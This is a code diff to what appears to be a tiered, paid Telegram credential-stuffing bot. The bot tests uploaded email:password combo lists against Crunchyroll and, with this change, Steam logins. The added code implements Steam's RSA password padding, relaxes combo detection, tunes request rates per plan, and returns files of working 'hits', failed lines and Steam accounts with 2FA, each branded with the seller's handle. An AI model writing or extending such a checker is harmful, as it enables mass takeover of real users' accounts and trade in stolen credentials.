@@ -23,8 +23,7 @@ from supabase import create_client, Client
 from datetime import datetime, date, timedelta, timezone
 from regions import REGION_HINTS
 import base64
-from Crypto.Util.number import bytes_to_long, long_to_bytes  # pip install pycryptodome if missing
-from steam_auth_pb2 import (          # you need this file
+from steam_auth_pb2 import (
     CAuthentication_GetPasswordRSAPublicKey_Request,
     CAuthentication_GetPasswordRSAPublicKey_Response,
     CAuthentication_BeginAuthSessionViaCredentials_Request,
@@ -1217,6 +1216,36 @@ Channel: {CHANNEL_USERNAME}
 
     return text
 
+def pkcs1pad2(data: str, keysize: int):
+    """PKCS1 padding used by Steam"""
+    if keysize < len(data) + 11:
+        return None
+    
+    buffer = [0] * keysize
+    i = len(data) - 1
+    
+    while i >= 0 and keysize > 0:
+        keysize -= 1
+        buffer[keysize] = ord(data[i])
+        i -= 1
+    
+    keysize -= 1
+    buffer[keysize] = 0
+    
+    while keysize > 2:
+        keysize -= 1
+        buffer[keysize] = int.from_bytes(os.urandom(1), 'big') % 254 + 1
+    
+    keysize -= 1
+    buffer[keysize] = 2
+    keysize -= 1
+    buffer[keysize] = 0
+    
+    result = 0
+    for byte in buffer:
+        result = (result << 8) | byte
+    return result
+
 def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str | None:
     password = ''.join(char for char in password if ord(char) <= 127)
     n = int(modulus_hex, 16)
@@ -1846,7 +1875,7 @@ async def handle_message(update: Update, context: CallbackContext):
     
     is_on_main_menu = context.user_data.get('in_main_menu', False)
     text = update.message.text.strip()
-    looks_like_combo = ':' in text and '@' in text
+    looks_like_combo = ':' in text
     
     # 🔥 NEW: Only trigger single checker when on the main dashboard
     if is_on_main_menu:
@@ -1872,13 +1901,15 @@ async def handle_message(update: Update, context: CallbackContext):
                 
             # ====================== RATE LIMITER FOR SINGLE CHECKS ======================
             # Same logic as bulk files
-            if limits["display_name"] == "FREE":
+            mode_name = stats.get("api_mode", "Crunchyroll")
+            if mode_name == "Steam":
+                max_rps = 8 if limits["display_name"] == "FREE" else 12 if "BASIC" in limits["display_name"] else 18
+            elif limits["display_name"] == "FREE":
                 max_rps = 12
             elif "BASIC" in limits["display_name"]:
                 max_rps = 22
-            else:  # VIP or YEARLY
+            else:
                 max_rps = 32
-
             rate_limiter = RateLimiter(max_rps=max_rps)
             rate_limiter.acquire()   # ← This was missing!
             
@@ -2075,7 +2106,10 @@ async def handle_document(update: Update, context: CallbackContext):
     hits = []
     start_time = time.time()
 
-    if limits["display_name"] == "FREE":
+    mode_name = stats.get("api_mode", "Crunchyroll")
+    if mode_name == "Steam":
+        max_rps = 8 if limits["display_name"] == "FREE" else 12 if "BASIC" in limits["display_name"] else 18
+    elif limits["display_name"] == "FREE":
         max_rps = 12
     elif "BASIC" in limits["display_name"]:
         max_rps = 22
@@ -2224,46 +2258,66 @@ async def handle_document(update: Update, context: CallbackContext):
         await progress_msg.edit_text(summary, parse_mode='HTML')
         await manage_result_pin(update, context, progress_msg.message_id)
 
-        # ====================== HITS + BAD FILES (your original code) ======================
+        # ====================== HITS + BAD + 2FA FILES (mode-aware) ======================
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        mode_name = stats.get("api_mode", "Crunchyroll")
         
         if hits_count > 0:
             current_stats = get_user_stats(user_id)
             user_plan = current_stats.get("plan", "FREE").upper()
-            mode = stats.get("api_mode", "Crunchyroll")
 
-            hits_text = f"🎉 {mode.upper()} HITS - {user_plan} PLAN\n" + "="*70 + "\n\n"
+            hits_text = f"🎉 {mode_name.upper()} HITS - {user_plan} PLAN\n" + "="*70 + "\n\n"
             for hit in hits:
-                hits_text += format_hit_for_file(hit, user_plan, mode)
+                hits_text += format_hit_for_file(hit, user_plan, mode_name)
 
-            hits_file = f"/tmp/crunchy_hits_{timestamp}.txt"
+            hits_file = f"/tmp/{mode_name.lower()}_hits_{timestamp}.txt"
             with open(hits_file, "w", encoding="utf-8") as f:
                 f.write(hits_text)
 
             fancy_caption = f"""
-👍 <b>{hits_count}x Crunchyroll Hits</b>
+👍 <b>{hits_count}x {mode_name} Hits</b>
 ────────────────────────
 ☰ BY @caydigitals ✅
 ────────────────────────
-<a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/cayigitals">Admin</a>
+<a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/caydigitals">Admin</a>
             """.strip()
 
             await update.message.reply_document(
                 document=open(hits_file, "rb"),
-                filename=f"Crunchyroll Hits @caydigitals.txt",
+                filename=f"{mode_name} Hits @caydigitals.txt",
                 caption=fancy_caption,
                 parse_mode='HTML'
             )
+
+        # === Save separate 2FA file for Steam ===
+        if mode_name == "Steam":
+            twofa_accounts = [hit for hit in hits if hit.get('twofa')]
+            if twofa_accounts:
+                twofa_text = f"🔐 STEAM 2FA ACCOUNTS - {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
+                twofa_text += "="*60 + "\n\n"
+                for acc in twofa_accounts:
+                    twofa_text += f"{acc['email']}:{acc['password']} | SteamID: {acc.get('steamid','N/A')}\n"
+                
+                twofa_file = f"/tmp/steam_2fa_{timestamp}.txt"
+                with open(twofa_file, "w", encoding="utf-8") as f:
+                    f.write(twofa_text)
+
+                await update.message.reply_document(
+                    document=open(twofa_file, "rb"),
+                    filename=f"Steam 2FA @caydigitals.txt",
+                    caption=f"🔐 {len(twofa_accounts)}x Steam Accounts with 2FA",
+                    parse_mode='HTML'
+                )
 
         if bad_count > 0:
             hit_emails = {hit['email'] for hit in hits}
             bad_lines = [f"{email}:{pwd} | Check_By = @caydigitals" for email, pwd in accounts if email not in hit_emails]
             
-            bad_text = f"❌ BAD ACCOUNTS | Crunchyroll\n"
+            bad_text = f"❌ BAD ACCOUNTS | {mode_name}\n"
             bad_text += f"{'='*40}\n"
             bad_text += "\n".join(bad_lines)
             
-            bad_file = f"/tmp/crunchy_bad_{timestamp}.txt"
+            bad_file = f"/tmp/{mode_name.lower()}_bad_{timestamp}.txt"
             with open(bad_file, "w", encoding="utf-8") as f:
                 f.write(bad_text)
 
@@ -2272,12 +2326,12 @@ async def handle_document(update: Update, context: CallbackContext):
 ────────────────────────────
 ☰ BY @caydigitals ✅
 ────────────────────────────
-<a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/cayigitals">Admin</a>
+<a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/caydigitals">Admin</a>
             """.strip()
 
             await update.message.reply_document(
                 document=open(bad_file, "rb"),
-                filename=f"Crunchyroll Bad @caydigitals.txt",
+                filename=f"{mode_name} Bad @caydigitals.txt",
                 caption=bad_caption,
                 parse_mode='HTML'
             )
